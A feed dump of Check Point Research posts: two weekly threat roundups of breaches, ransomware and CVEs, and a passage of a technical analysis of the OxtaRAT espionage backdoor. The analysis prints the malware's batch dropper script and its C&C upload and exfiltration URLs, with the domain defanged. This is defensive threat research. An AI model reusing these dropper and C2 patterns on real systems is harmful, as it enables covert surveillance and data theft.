            "summary": "<p>For the latest discoveries in cyber research for the week of 27th February, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES Stanford University experienced a data breach in which files containing Economics Ph.D. program admission information were leaked. Personal and health information of 897 applicants might have been exposed. Dish Network, a major American [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/27th-february-threat-intelligence-report/\" rel=\"nofollow\">27th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>For the latest discoveries in cyber research for the week of 27th February, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES Stanford University experienced a data breach in which files containing Economics Ph.D. program admission information were leaked. Personal and health information of 897 applicants might have been exposed. Dish Network, a major American [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/27th-february-threat-intelligence-report/\" rel=\"nofollow\">27th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p>For the latest discoveries in cyber research for the week of 27th February, please download our <a href=\"https://research.checkpoint.com/wp-content/uploads/2023/02/Threat_Intelligence_News_2023-02-27.pdf\">Threat_Intelligence Bulletin</a></p>\n<p><strong>TOP ATTACKS AND BREACHES</strong></p>\n<ul>\n<li>Stanford University <a href=\"https://www.bleepingcomputer.com/news/security/stanford-university-discloses-data-breach-affecting-phd-applicants/\">experienced</a> a data breach in which files containing Economics Ph.D. program admission information were leaked. Personal and health information of 897 applicants might have been exposed.</li>\n<li>Dish Network, a major American TV and satellite broadcast provider, had been <a href=\"https://www.bleepingcomputer.com/news/security/dish-network-goes-offline-after-likely-cyberattack-employees-cut-off/\">experiencing</a> an unexplained outage with its websites and apps. Shortly after, the company\u2019s employees detected suspicious activity on their desktops and reported it as a cyberattack.</li>\n<li>Canadian telecom TELUS is <a href=\"https://www.bleepingcomputer.com/news/security/telus-investigating-leak-of-stolen-source-code-employee-data/\">investigating</a> a potential data breach after a threat actor allegedly stole employee data and source code and shared samples online. So far, no corporate or retail customer data has been reported stolen.</li>\n<li>Dole Food Company, a major American producer and distributor of fresh fruits and vegetables, has <a href=\"https://www.dole.com/en/press/2023/dole-experiences-cybersecurity-incident\">confirmed</a> a ransomware attack that disrupted its operations. The company is assessing the situation to determine the extent of the incident, while also notifying law enforcement authorities.</li>\n<li>Russian state hackers have <a href=\"https://cip.gov.ua/en/news/viyavleno-kiberataku-na-nizku-ukrayinskikh-derzhavnikh-informaciinikh-resursiv\">breached</a> multiple government websites in Ukraine by exploiting backdoors that were planted as early as December 2021. CERT-UA, the Computer Emergency Response Team of Ukraine, identified the attacks after finding a web shell on one of the compromised sites. This web shell allowed the hackers, who go by the names UAC-0056, Ember Bear, or Lorec53, to install more malware.</li>\n<li>An ongoing malware campaign <a href=\"https://www.bitdefender.com/blog/labs/s1deload-stealer-exploring-theeconomics-of-social-networkaccount-hijacking/\">targets</a> YouTube and Facebook users, infecting their computers with a new information stealer dubbed S1deload that will hijack their social media accounts and use their devices to mine for cryptocurrency.</li>\n<li>The founders of Forsage, a decentralized finance (DeFi) investment platform, have been <a href=\"https://www.bleepingcomputer.com/news/security/forsage-defi-platform-founders-indicted-for-340-million-scam/\">indicted</a> for running a $340 million Ponzi and pyramid scheme.</li>\n<li>Hydrochasma, a new cybercriminal group, <a href=\"https://www.bleepingcomputer.com/news/security/hydrochasma-hackers-target-medical-research-labs-shipping-firms/\">targets</a> COVID-19 research labs and shipping firms. The group make use of open-source tools and &#8220;living off the land&#8221; tactics to steal intelligence and evade detection. Researchers have been tracking them since October 2022, but attribution is proving difficult.</li>\n</ul>\n<p><strong>VULNERABILITIES AND PATCHES</strong></p>\n<ul>\n<li>VMware has <a href=\"https://www.vmware.com/security/advisories/VMSA-2023-0005.html\">released</a> patches to address a critical security vulnerability (tracked as CVE-2023-20858, CVSS score of 9.1), affecting its Carbon Black App Control product.</li>\n<li>Proof of Concept for CVE-2023-21839 in the Oracle WebLogic Server product has been <a href=\"https://github.com/DXask88MA/Weblogic-CVE-2023-21839\">released</a>. This vulnerability would allow for unauthenticated attacker to gain network access via T3, IIOP.</li>\n<li>The U.S. Cybersecurity and Infrastructure Security Agency (CISA) <a href=\"https://thehackernews.com/2023/02/us-cybersecurity-agency-cisa-adds-three.html\">updated</a> its Known Exploited Vulnerabilities catalog with three security flaws that are currently being actively exploited. The list includes a code execution vulnerability in IBM Aspera Faspex (CVE-2022-47986, CVSS score: 9.8) and two vulnerabilities in Mitel MiVoice Connect, including a code injection vulnerability (CVE-2022-41223, CVSS score: 6.8) and a command injection vulnerability (CVE-2022-40765, CVSS score: 6.8).</li>\n</ul>\n<p><strong>THREAT </strong><strong>INTELLIGENCE REPORT</strong></p>\n<ul>\n<li>One year into the Russia-Ukraine war, Check Point Research <a href=\"https://blog.checkpoint.com/2023/02/21/the-russian-ukrainian-war-one-year-later/\">marks</a> September 2022 as a turning point, as weekly cyber-attacks against Ukraine decreased by 44%, while cyber-attacks against some NATO countries increased by nearly 57%. Further analysis of this year lists wipers and hacktivism as key trends.</li>\n<li>Dariy Pankov, a Russian citizen accused of creating and selling the NLBrute password-cracking tool, was <a href=\"https://www.justice.gov/usao-mdfl/pr/russian-malware-developer-arrested-and-extradited-united-states\">extradited</a> from Georgia to the US after his arrest in October 2022. Pankov, also known as dpxaker, is charged with access device fraud and computer fraud, carrying a maximum sentence of 47 years in federal prison.</li>\n<li>Researchers have <a href=\"https://www.menlosecurity.com/blog/purecrypter-targets-government-entities-through-discord/\">found</a> a new threat actor using an evasive Discord campaign to target government entities. PureCrypter downloader and a compromised non-profit organization&#8217;s domain are used to deliver various malware types, including Redline Stealer and Philadelphia Ransomware.</li>\n<li>As OpenAI <a href=\"https://www.bleepingcomputer.com/news/security/hackers-use-fake-chatgpt-apps-to-push-windows-android-malware/\">introduced</a> of a paid ChatGPT tier called ChatGPT Plus, threat actors are now offering so called free access to the platform, luring users to download malicious apps or visit phishing websites.</li>\n<li>Dutch police has <a href=\"https://www.bleepingcomputer.com/news/security/dutch-police-arrest-three-ransomware-actors-extorting-25-million/\">arrested</a> three men aged 18 to 21 for ransomware activity. The suspects are accused of extorting small and large organizations in multiple countries and making \u20ac2.5 million in the process.</li>\n<li>HardBit ransomware has evolved to version 2.0 and its operators are now <a href=\"https://www.bleepingcomputer.com/news/security/hardbit-ransomware-wants-insurance-details-to-set-the-perfect-price/\">manipulating</a> insurance policies to maximize ransom payments. The attackers persuade victims to reveal their insurance details, allowing them to tailor their ransom demands to ensure the costs are fully covered.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation provides protection against this threat </em><em>(Virus.Wins.Neshta.M; Trojan.Wins.Imphash.P )</em></p>\n\n\n<p></p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/27th-february-threat-intelligence-report/\" rel=\"nofollow\">27th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "20th February \u2013 Threat Intelligence Report",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "20th February \u2013 Threat Intelligence Report"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/20th-february-threat-intelligence-report/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/20th-february-threat-intelligence-report/",
            "authors": [
                {
                    "name": "hagarb"
                }
            ],
            "author": "hagarb",
            "author_detail": {
                "name": "hagarb"
            },
            "published": "Mon, 20 Feb 2023 16:33:22 +0000",
            "published_parsed": [
                2023,
                2,
                20,
                16,
                33,
                22,
                0,
                51,
                0
            ],
            "tags": [
                {
                    "term": "Global Cyber Attack Reports",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27496",
            "guidislink": false,
            "summary": "<p>For the latest discoveries in cyber research for the week of 20th February, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES Check Point Research identified a campaign against entities in Armenia, using a new version of OxtaRAT &#8211; an AutoIt-based backdoor for remote access and desktop surveillance. The threat actors have been targeting human [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/20th-february-threat-intelligence-report/\" rel=\"nofollow\">20th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>For the latest discoveries in cyber research for the week of 20th February, please download our Threat_Intelligence Bulletin TOP ATTACKS AND BREACHES Check Point Research identified a campaign against entities in Armenia, using a new version of OxtaRAT &#8211; an AutoIt-based backdoor for remote access and desktop surveillance. The threat actors have been targeting human [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/20th-february-threat-intelligence-report/\" rel=\"nofollow\">20th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<p>For the latest discoveries in cyber research for the week of 20th February, please download our <a href=\"https://research.checkpoint.com/wp-content/uploads/2023/02/Threat_Intelligence_News_2023-02-20.pdf\">Threat_Intelligence Bulletin</a></p>\n<p><strong>TOP ATTACKS AND BREACHES</strong></p>\n<ul>\n<li>Check Point Research <a href=\"https://research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/\">identified</a> a campaign against entities in Armenia, using a new version of OxtaRAT &#8211; an AutoIt-based backdoor for remote access and desktop surveillance. The threat actors have been targeting human rights organizations, dissidents, and independent media in Azerbaijan for several years, amid rising tensions between Azerbaijan and Armenia over the Lachin corridor.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation and Anti-Bot provides protection against this threat </em><em>(Trojan.Win.OxtaRAT.A; Trojan.WIN32.OxtaRAT)</em></p>\n<ul>\n<li>Web hosting company GoDaddy has <a href=\"https://www.bleepingcomputer.com/news/security/godaddy-hackers-stole-source-code-installed-malware-in-multi-year-breach/\">reported</a> a security breach where attackers stole source code and planted malware on its servers. The company discovered the breach to its cPanel shared hosting environment in late 2022, yet the attackers apparently had access to the network for several years.</li>\n<li>Australian software company Atlassian <a href=\"https://cyberscoop.com/atlassian-hack-employee-data-seigedsec/\">experienced</a> a data leak after threat actors used stolen employee credentials to access a third-party vendor&#8217;s data; customer data remains secure, but employees data has allegedly been leaked. Hacking group SeigedSec has taken credit, sharing the stolen data on Telegram.</li>\n<li>Scandinavian Airlines has <a href=\"https://www.sasgroup.net/newsroom/press-releases/2023/sas-cyber-attack--update/\">issued</a> a warning to passengers about a cyberattack that caused an outage of its website and mobile app for several hours, and resulted in the exposure of customer data; including contact details, past and future flights, and the last four digits of credit card numbers.</li>\n<li>City of Oakland has <a href=\"https://cao-94612.s3.amazonaws.com/documents/Proclamation_of_Local_Emergency_Due_to_Cybersecurity_Incident_Feb_14.pdf\">announced</a> a local state of emergency as they are dealing with a ransomware attack that forced the city to take its IT systems offline.</li>\n<li>Community Health Systems, one of the leading healthcare providers in the US, has confirmed that it was <a href=\"https://www.bleepingcomputer.com/news/security/healthcare-giant-chs-reports-first-data-breach-in-goanywhere-hacks/\">affected</a> by the recent attacks targeting a zero-day vulnerability in Fortra&#8217;s GoAnywhere MFT file transfer platform, revealing that the breach exposed personal information of almost 1 million patients.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point IPS provides protection against this threat </em><em>(GoAnywhere MFT Insecure Deserialization)</em></p>\n<ul>\n<li>The massive ESXiArgs ransomware campaign continues to expand, and recently <a href=\"https://thehackernews.com/2023/02/esxiargs-ransomware-hits-over-500-new.html\">affected</a> over 500 hosts with the majority located in France, Germany, the Netherlands, the U.K., and Ukraine.</li>\n<li>MortalKombat ransomware and Laplas Clipper were <a href=\"https://blog.talosintelligence.com/new-mortalkombat-ransomware-and-laplas-clipper-malware-threats/\">observed</a> in a recent financially motivated campaign, with the ransomware extorting money from victims by offering a decryptor and Laplas used to steal cryptocurrency by hijacking crypto transactions.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point Threat Emulation and Harmony Endpoint provide protection against this threat (Ransomware.Win.Xorist.*)</em></p>\n<p><strong>VULNERABILITIES AND PATCHES</strong></p>\n<ul>\n<li>Hyundai and KIA <a href=\"https://www.bleepingcomputer.com/news/security/hyundai-kia-patch-bug-allowing-car-thefts-with-a-usb-cable/\">issued</a> an emergency software update for several car models that have been vulnerable to an easy hack that enables theft. The US Department of Transportation has disclosed that over 8 million Hyundai and KIA cars have been impacted by this security flaw, and that the hacks have resulted in at least 14 car crashes and 8 fatalities.</li>\n<li>Microsoft has <a href=\"https://msrc.microsoft.com/update-guide/releaseNote/2023-Feb\">released</a> security updates to a total of 77 flaws in the latest Patch Tuesday. Nine vulnerabilities have been classified as &#8216;Critical&#8217; as they allow remote code execution on vulnerable devices, and three are actively exploited in attacks (CVE-2023-21823, CVE-2023-21715 and CVE-2023-23376).</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point IPS provides protection against these threats </em><em>(Microsoft Windows Graphics Component Elevation of Privilege (CVE-2023-21823); Microsoft Office Security Feature Bypass (CVE-2023-21715); Microsoft Windows Common Log File System Driver Elevation of Privilege (CVE-2023-23376) etc.)</em></p>\n<ul>\n<li>Fortinet has <a href=\"https://www.fortiguard.com/psirt/FG-IR-22-300\">released</a> security updates for its FortiNAC and FortiWeb products, which tackle two critical-severity vulnerabilities (tracked as CVE-2022-39952 and CVE-2021-42756) that could enable unauthorized attackers to execute arbitrary code or command execution without authentication.</li>\n<li>Apple <a href=\"https://thehackernews.com/2023/02/patch-now-apples-ios-ipados-macos-and.html\">shared</a> emergency security updates for iOS, iPadOS, macOS, and Safari browser, to fix a zero-day vulnerability (tracked as CVE-2023-23529), which is claimed to be actively exploited in the wild.</li>\n</ul>\n<p><strong>THREAT </strong><strong>INTELLIGENCE REPORT</strong></p>\n<ul>\n<li>Check Point CloudGuard Spectral <a href=\"https://blog.checkpoint.com/2023/02/14/check-point-cloudguard-spectral-detects-malicious-crypto-mining-packages-on-npm-the-leading-registry-for-javascript-open-source-packages/\">detected</a> malicious crypto-mining packages on NPM, the leading registry for JavaScript Open-Source packages. The packages enabled Cryptojacking, which involves using a machine to mine cryptocurrencies without the user&#8217;s consent.</li>\n<li>Researchers have <a href=\"https://www.trendmicro.com/en_us/research/23/b/earth-kitsune-delivers-new-whiskerspy-backdoor.html\">identified</a> a new backdoor, WhiskerSpy, used in a campaign by an advanced threat actor named \u2018Earth Kitsune\u2019. The actor targets individuals with an interest in North Korea, selecting victims from visitors to a pro North Korea website through a watering hole attack.</li>\n<li>A new variant of the Mirai botnet (tracked as &#8216;V3G4&#8217;) has been <a href=\"https://unit42.paloaltonetworks.com/mirai-variant-v3g4/\">discovered</a>, used in DDoS attacks to target Linux-based servers and IoT devices by exploiting 13 different vulnerabilities. The malware was spotted in three separate campaigns between July and December of 2022.</li>\n</ul>\n<p style=\"padding-left: 40px;\"><em>Check Point IPS provides protection against these threats </em><em>(Atlassian Confluence Remote Code Execution (CVE-2022-26134); Airspan AirSpot 5410 Command Injection (CVE-2022-36267); Draytek Vigor Command Injection (CVE-2020-8515); FreePBX callmenum Remote Code Execution, etc.)</em></p>\n<ul>\n<li>A new malware called &#8216;Frebniis&#8217; has been <a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/frebniis-malware-iis\">discovered</a>, deployed on Microsoft&#8217;s IIS web servers. The malware operates silently by executing commands that are sent via web requests.</li>\n</ul>\n\n\n<p></p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/20th-february-threat-intelligence-report/\" rel=\"nofollow\">20th February \u2013 Threat Intelligence Report</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "Operation Silent Watch: Desktop Surveillance in Azerbaijan and Armenia",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "Operation Silent Watch: Desktop Surveillance in Azerbaijan and Armenia"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/",
            "authors": [
                {
                    "name": "etal"
                }
            ],
            "author": "etal",
            "author_detail": {
                "name": "etal"
            },
            "published": "Thu, 16 Feb 2023 10:56:45 +0000",
            "published_parsed": [
                2023,
                2,
                16,
                10,
                56,
                45,
                3,
                47,
                0
            ],
            "tags": [
                {
                    "term": "Check Point Research Publications",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "Threat Research",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "Malware",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27412",
            "guidislink": false,
            "summary": "<p>Executive summary Amid rising tensions between Azerbaijan and Armenia over the Lachin corridor in late 2022, Check Point Research identified a malicious campaign against entities in Armenia. The malware distributed in this campaign is a new version of a backdoor we track as OxtaRAT, an AutoIt-based tool for remote access and desktop surveillance. Key findings: [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/\" rel=\"nofollow\">Operation Silent Watch: Desktop Surveillance in Azerbaijan and Armenia</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>Executive summary Amid rising tensions between Azerbaijan and Armenia over the Lachin corridor in late 2022, Check Point Research identified a malicious campaign against entities in Armenia. The malware distributed in this campaign is a new version of a backdoor we track as OxtaRAT, an AutoIt-based tool for remote access and desktop surveillance. Key findings: [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/operation-silent-watch-desktop-surveillance-in-azerbaijan-and-armenia/\" rel=\"nofollow\">Operation Silent Watch: Desktop Surveillance in Azerbaijan and Armenia</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<h2 class=\"wp-block-heading\"><strong>Executive summary</strong></h2>\n\n\n\n<p>Amid <a href=\"https://edition.cnn.com/2023/01/12/europe/armenia-azerbaijan-nagorno-karabakh-lachin-intl/index.html\">rising tensions</a> between Azerbaijan and Armenia over the Lachin corridor in late 2022, Check Point Research identified a malicious campaign against entities in Armenia. The malware distributed in this campaign is a new version of a backdoor we track as OxtaRAT, an AutoIt-based tool for remote access and desktop surveillance.</p>\n\n\n\n<p><strong>Key findings:</strong></p>\n\n\n\n<ul>\n<li>The newest version of OxtaRAT is a polyglot file, which combines compiled AutoIT script and an image. The tool capabilities include searching for and exfiltrating files from the infected machine, recording the video from the web camera and desktop, remotely controlling the compromised machine with TightVNC, installing a web shell, performing port scanning, and more.</li>\n\n\n\n<li>Compared to previous campaigns of this threat actor, the latest campaign from November 2022 presents changes in the infection chain, improved operational security, and new functionality to improve the ways to steal the victim\u2019s data.</li>\n\n\n\n<li>The threat actors behind these attacks have been targeting human rights organizations, dissidents, and independent media in Azerbaijan for several years. This is the first time there is a clear indication of these attackers using OxtaRAT against Armenian targets and targeting corporate environments.</li>\n</ul>\n\n\n\n<p>In this report, we provide a full technical analysis of the OxtaRAT as well as its capabilities and evolution over the years. We also discuss the tactics, techniques and procedures (TTPs) of the threat actors, complete with an overview of their activity throughout the years.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Background</strong></h2>\n\n\n\n<p>The Republic of Artsakh, also known as the&nbsp;Nagorno-Karabakh Republic, is a breakaway region in the South Caucasus with a majority ethnic Armenian population but is recognized internationally as part of Azerbaijan. It is a de facto enclave within Azerbaijan, with the only land route to&nbsp;Armenia through the Lachin corridor, which has been under the control of Russian peacekeepers since the end of the&nbsp;Second Nagorno-Karabakh War in 2020.</p>\n\n\n\n<p>The situation in Artsakh is tense, with frequent ceasefire violations and sporadic outbreaks of violence. For more than two decades, this unresolved highly militarized ethno-nationalist territorial conflict continues to be a source of tension between Armenia and Azerbaijan.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27419\" height=\"492\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image1_conflict_map.png\" width=\"784\" /><figcaption class=\"wp-element-caption\">Figure 1 \u2013 Map of the conflict over Nagorno-Karabakh (Artsakh). Source: <a href=\"https://edition.cnn.com/2023/01/12/europe/armenia-azerbaijan-nagorno-karabakh-lachin-intl/index.html\">CNN</a>.</figcaption></figure></div>\n\n\n<h2 class=\"wp-block-heading\"><strong>The Infection Chain</strong></h2>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27420\" height=\"764\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image2_infection_chain.png\" width=\"1368\" /><figcaption class=\"wp-element-caption\">Figure 2 \u2013 The infection chain.</figcaption></figure></div>\n\n\n<p>A malicious file named <code>Israeli_NGO_thanks_Artsakh_bank_for_the_support_of.scr</code><strong> </strong>was submitted to VirusTotal (VT) on November 29, 2022, from an IP address located in Yerevan, Armenia.</p>\n\n\n\n<p>It is a self-extracting archive that masquerades as a PDF file and bears a PDF icon. Upon execution, it drops to the Temp folder of the infected device and executes a self-extracting cab called <code>Alexander_Lapshin.EXE</code>. This in turn drops multiple additional files and executes one of them &#8211; the <code>exec.bat</code> script. In its deobfuscated form, this script is very short:</p>\n\n\n\n<div class=\"wp-block-group is-layout-constrained\"><div class=\"wp-block-group__inner-container\">\n<div class=\"wp-block-group is-layout-constrained\"><div class=\"wp-block-group__inner-container\">\n<pre class=\"EnlighterJSRAW\">@echo off\nxcopy /y /e /k /h /i *\u00a0 %appdata%\\Autoit3\\\ncopy /b /y %appdata%\\Autoit3\\Alexander_Lapshin.pdf %temp%\\\nstart %temp%\\Alexander_Lapshin.pdf\nstart %appdata%\\Autoit3\\Autoit3.exe %appdata%\\Autoit3\\icon.png\nexit</pre>\n\n\n\n<p>The <code>exec.bat</code> file is responsible for opening a lure PDF file that contains a <a href=\"https://en.wikipedia.org/wiki/Alexander_Lapshin\">Wikipedia article</a> about Alexander Lapshin. At the same time, in the background, it copies multiple auxiliary files and the AutoIt interpreter to <code>%appdata%\\Autoit3\\</code> and uses it to execute a malicious AutoIt code hidden inside an image called <code>icon.png</code>.</p>\n</div></div>\n</div></div>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27421\" height=\"794\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image3_lure_document.png\" width=\"723\" /><figcaption class=\"wp-element-caption\">Figure 3 \u2013 Lure PDF document.</figcaption></figure></div>\n\n\n<p>Alexander Lapshin, a Russian-Israeli travel blogger, journalist, and human rights activist, was detained in Belarus in 2016 and extradited to Azerbaijan. He was sentenced to 3 years in prison for illegally crossing the internationally recognized borders of Azerbaijan, without authorization from the Azerbaijani authorities, in 2011 and 2012 while visiting Nagorno-Karabakh from Armenia. Nine months into his detention, in September 2017, Lapshin was attacked in a solitary confinement cell of a Baku pre-trial detention center. The attack was publicly declared by Azerbaijani officials to be a suicide attempt. Afterward, he was pardoned by the Azerbaijani President and deported to Israel.</p>\n\n\n\n<p>In 2021, the European Court of Human Rights in the \u201c<a href=\"https://hudoc.echr.coe.int/fre#{%22tabview%22:[%22notice%22],%22itemid%22:[%22001-210045%22]}\">CASE OF LAPSHIN v. AZERBAIJAN</a><strong>\u201d </strong>ruled that Lapshin\u2019s right to life had been violated by Azerbaijan authorities and mandated that Azerbaijan pay&nbsp;30,000 Euros as compensation. After the verdict, Lapshin publicly <a href=\"https://www.facebook.com/lapshin/posts/pfbid047bhbtFcrAR7qokkuvgtiTfDgPGaXx54a2qzakeNzeFZusfrJX5md94p6mqpiFiol\">posted</a> a picture of the credit card he opened to receive his compensation, issued by the Armenian Artsakhbank. Likely, this incident made Lapshin\u2019s name an attractive lure for the attackers targeting the bank.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>The OxtaRAT Backdoor</strong></h2>\n\n\n\n<p>As we mentioned previously, AutoIT.exe is used to run code from an image called <code>icon.png</code>. This is a polyglot malware, combining valid JPEG and AutoIT A3X file formats:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27422\" height=\"222\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image4_polyglot_file.png\" width=\"778\" /><figcaption class=\"wp-element-caption\">Figure 4 \u2013 Icon.png image and its internal structure.</figcaption></figure></div>\n\n\n<p>AutoIT is a legitimate tool that is used by many IT administrators to automate tasks but is frequently abused by threat actors. In this case, the actors use a fully functional backdoor containing approximately 20,000 lines of obfuscated AutoIt code:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><img alt=\"\" class=\"wp-image-27468\" height=\"230\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/02/image5.png\" width=\"1285\" /><figcaption class=\"wp-element-caption\">Figure 5 &#8211; Fragment of OxtaRAT code including string obfuscations and random names.</figcaption></figure></div>\n\n\n<p>The backdoor, which we call OxtaRAT, contains a variety of capabilities typically associated with espionage activity. It contains commands that allow the attackers to:</p>\n\n\n\n<ul>\n<li>Run additional code on the infected machine, install a PHP web shell, download, upload and execute files.</li>\n\n\n\n<li>Search and exfiltrate files from specific locations or with specific patterns, and even install the <a href=\"https://github.com/dulldusk/phpfm\">PHP FileManager</a> for easier access to and management of the files.</li>\n\n\n\n<li>Perform active surveillance activity: record video from a web camera or desktop, and install additional software, such as TightVNC, to remotely control and monitor the machine.</li>\n\n\n\n<li>Perform recon on the local machine, such as getting information about the processes, drives, system information, and the speed of the internet connection using Speedtest.</li>\n\n\n\n<li>Use a compromised host as a pivot to move through the network: perform port scanning and use Putty\u2019s plink for tunneled communication.</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Execution flow</strong></h2>\n\n\n\n<p>The backdoor starts by first setting up its base folder, moving the <code>icon.png</code> file there, and adding a persistence mechanism to run it every 2 minutes with AutoIt3.exe via a scheduled task named <code>WallPaperChangeApp</code>. It also creates a working folder to store the results and logs of each command execution and sets hidden and system attributes for both base and working folders to conceal them from being easily discovered and arouse suspicion. It also downloads the legitimate <strong>curl </strong>executable and DLL, which are later used for some types of C&amp;C communication.</p>\n\n\n\n<p>The C&amp;C server for this sample is <code>edupoliceam[.]info</code>, a lookalike for the domain of the Police Education Complex of Police of the Republic of Armenia.</p>\n\n\n\n<p>Next, the malware enters the main infinite loop, where in each step it performs the following actions:</p>\n\n\n\n<ul>\n<li>Creates a screenshot of the infected computer.</li>\n\n\n\n<li>Sends a GET request to the C&amp;C server to report the victim\u2019s basic information: <code>https://edupoliceam[.]info/upload.php?GUID=&lt;guid&gt;&amp;SYS=PC_Name|User_Name|IP_address</code>.</li>\n\n\n\n<li>Uploads (using curl) to the C&amp;C server all the files from the working folder which contain screenshots and the results and logs of the previous command execution.</li>\n\n\n\n<li>Sends a GET request to C&amp;C server to retrieve the command from the URL: <code>https://edupoliceam[.]info/upload.php?GUID=&lt;guid&gt;&amp;come=1</code>.</li>\n</ul>\n\n\n\n<p>Most of the capabilities require additional files, mostly legitimate, to be downloaded during the malware execution from the path on the server <code>/requirement/up/bin/</code>:</p>\n\n\n\n<figure class=\"wp-block-table\"><table><tbody><tr><td>/requirement/up/bin/postup.exe (curl.exe)<br />/requirement/up/bin/libcurl.dll<br />/requirement/up/bin/vlc.zip<br />/requirement/up/bin/7zxa.dll<br />/requirement/up/bin/7za.exe<br />/requirement/up/bin/7za.dll<br />/requirement/up/bin/pscclient.exe (port scanner)<br />/requirement/up/bin/ptun.exe (Plink)<br />/requirement/up/bin/wintight.exe (TightVNC)<br />/requirement/up/bin/wsrrun.exe (PHP CLI and PHP File Manager, <a href=\"https://sourceforge.net/projects/phpfm/\" rel=\"noreferrer noopener\" target=\"_blank\">https://sourceforge.net/projects/phpfm/</a>)<br />/requirement/up/bin/WinRAR32.zip<br />/requirement/up/bin/WinRAR64.zip<br />/requirement/up/bin/speedtest.zip (based on <a href=\"https://github.com/sivel/speedtest-cli\" rel=\"noreferrer noopener\" target=\"_blank\">https://github.com/sivel/speedtest-cli</a>)<br />/requirement/up/bin/AppCrashCollector.exe (the &#8220;implant&#8221;)</td></tr></tbody></table></figure>\n\n\n\n<p>The only next-stage tool that wasn\u2019t available on the server, was <code>AppCrashCollector.exe</code><strong>,</strong> whose download and execution are triggered by the <code>implant</code> command. We assume that this is the payload that the actors attempt to hide from researchers and deliver to important targets only after additional checks are performed on the infected machine.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>C&amp;C communication and commands</strong></h2>\n\n\n\n<p>The communication between the malware and its C&amp;C server is based on clear text commands, the arguments for each command are separated by the \u201c|\u201d 